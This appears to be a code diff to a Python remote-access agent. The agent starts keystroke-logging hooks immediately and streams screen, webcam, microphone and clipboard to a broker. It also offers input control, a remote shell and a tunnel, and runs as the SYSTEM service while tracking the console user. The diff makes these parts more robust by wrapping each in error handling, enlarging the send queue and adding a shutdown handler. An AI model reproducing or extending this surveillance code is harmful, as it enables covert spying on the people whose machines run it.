@@ -156,12 +156,31 @@ class AsyncAgent:
         # Components
         self.capturer = ScreenCapturer(quality=70, scale=1.0)
         self.auditor = KeyAuditor(self.send_key_sync)  # Retain original auditor init
-        self.auditor.start()  # START HOOKS IMMEDIATELY
-        self.webcam = WebcamStreamer(quality=40)  # Retain original webcam settings
-        self.mic = AudioStreamer()
+        try:
+            self.auditor.start()  # START HOOKS IMMEDIATELY
+        except Exception as e:
+            print(f"[-] KeyAuditor Start Failed: {e}")
+            
+        try:
+            self.webcam = WebcamStreamer(quality=40)  # Retain original webcam settings
+        except Exception as e:
+            print(f"[-] Webcam Init Failed: {e}")
+            self.webcam = None
+            
+        try:
+            self.mic = AudioStreamer()
+        except Exception as e:
+            print(f"[-] Mic/Audio Init Failed: {e}")
+            self.mic = None
+            
         self.sys_audio = None  # Lazy init on demand
         self.sys_audio_streaming = False
-        self.input_ctrl = InputController()
+        
+        try:
+            self.input_ctrl = InputController()
+        except Exception as e:
+            print(f"[-] InputController Init Failed: {e}")
+            self.input_ctrl = None
         # Privacy component
         # self.privacy = PrivacyCurtain()
         self.clipboard_consent = True
@@ -183,16 +202,14 @@ class AsyncAgent:
             on_exit=self.on_shell_exit,
             on_cwd=self.on_shell_cwd,
         )
-        self.username = "Unknown"
+        self.device_settings = DeviceSettings()
+        # DYNAMIC USERNAME: Use WTS API to get actual console user (or "Login Screen")
+        # instead of the service account (SYSTEM).
         try:
-            self.username = os.getlogin()
-        except OSError:
-            try:
-                self.username = getpass.getuser()
-            except Exception:
-                self.username = (
-                    os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
-                )
+            sys_info = self.device_settings.get_sysinfo()
+            self.username = sys_info.get("user", "Unknown")
+        except Exception:
+            self.username = "Unknown"
         self.direct_url = None
         self.clipboard_handler = ClipboardHandler(on_change=self.on_clipboard_change)
         # Monitoring starts in _push_initial_data background task
@@ -335,6 +352,14 @@ class AsyncAgent:
             except Exception as e:
                 print(f"[-] Shutdown error closing websocket: {e}")
 
+        # 3. Stop Tunnel Manager (Prevent Zombie Processes)
+        if getattr(self, "tunnel_mgr", None):
+            try:
+                print("[*] Stopping Tunnel Manager...")
+                self.tunnel_mgr.stop()
+            except Exception as e:
+                print(f"[-] Error stopping tunnel: {e}")
+
     def _get_or_create_id(self):
         """Get machine ID from Keyring or generate a new one."""
         if not keyring:
@@ -449,6 +474,12 @@ class AsyncAgent:
             # 1. Update Registry
             try:
                 if self.direct_url:
+                    # DYNAMIC UPDATE: Check for user login/logout events
+                    try:
+                        self.username = self.device_settings.get_sysinfo().get("user", self.username)
+                    except:
+                        pass
+
                     payload = {
                         "id": self.my_id,
                         "username": self.username,
@@ -922,7 +953,7 @@ class AsyncAgent:
             self._shutdown_event = asyncio.Event()
             self._heartbeat_trigger = asyncio.Event()
 
-            self.send_queue = asyncio.Queue(maxsize=100)
+            self.send_queue = asyncio.Queue(maxsize=50000)
             self._create_background_task(self.supervisor_watchdog())
             self._sender_task = self._create_background_task(self._sender_worker())
 
@@ -2299,6 +2330,30 @@ def main():
             return
 
         agent = AsyncAgent(DEFAULT_BROKER)
+
+        # --- SHUTDOWN HANDLER (Prevent Zombies) ---
+        if platform.system() == "Windows":
+            import ctypes
+            kernel32 = ctypes.windll.kernel32
+            
+            # Define handler type: BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
+            HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)
+
+            def console_ctrl_handler(ctrl_type):
+                # CTRL_C=0, CTRL_BREAK=1, CTRL_CLOSE=2, CTRL_LOGOFF=5, CTRL_SHUTDOWN=6
+                if ctrl_type in (5, 6): # Logoff or Shutdown
+                    print(f"[!] Shutdown/Logoff Signal ({ctrl_type}) Received! Cleaning up...")
+                    try:
+                        agent.stop()
+                    except Exception as e:
+                        print(f"[-] Cleanup Error: {e}")
+                    return True # Handled
+                return False # Pass to next handler
+
+            # Keep reference to prevent GC
+            _handler_ref = HandlerRoutine(console_ctrl_handler)
+            kernel32.SetConsoleCtrlHandler(_handler_ref, True)
+        
         agent.start(local_mode=args.local)
     except Exception:
         pass
